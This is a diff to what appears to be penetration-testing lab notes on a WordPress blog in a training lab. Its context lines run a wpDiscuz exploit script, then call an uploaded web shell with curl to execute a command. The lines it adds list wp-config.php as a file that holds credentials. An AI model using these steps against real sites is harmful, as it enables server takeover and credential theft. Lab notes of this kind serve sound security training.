@@ -76,3 +76,8 @@ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 # Execution
 curl -s http://blog.inlanefreight.local/wp-content/uploads/.../shell.php?cmd=id
 ```
+## 5. Sensitive Files
+```shell
+# Configuration file with user & password
+/var/www/html/wp-config.php
+```
